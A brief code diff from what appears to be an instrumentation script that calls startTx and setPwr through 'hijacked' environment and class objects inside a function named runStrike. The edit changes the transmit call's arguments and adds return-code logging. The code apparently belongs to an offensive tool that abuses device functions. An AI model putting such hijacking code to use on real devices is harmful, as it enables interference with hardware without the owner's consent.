@@ -50,8 +50,9 @@ function runStrike(funcs) {
             setPwr(hijackedEnv, hijackedClass, 0, 0, 20, 0, 0); 
         }
 
-        var res = startTx(hijackedEnv, hijackedClass, 0, 6, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0);
-        
+        var res = startTx(hijackedEnv, hijackedClass, 0, 7, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0);
+		console.log("[?] Return Code: " + res);
+
         if(res == 0) {
             Thread.sleep(1.0);
         } else {
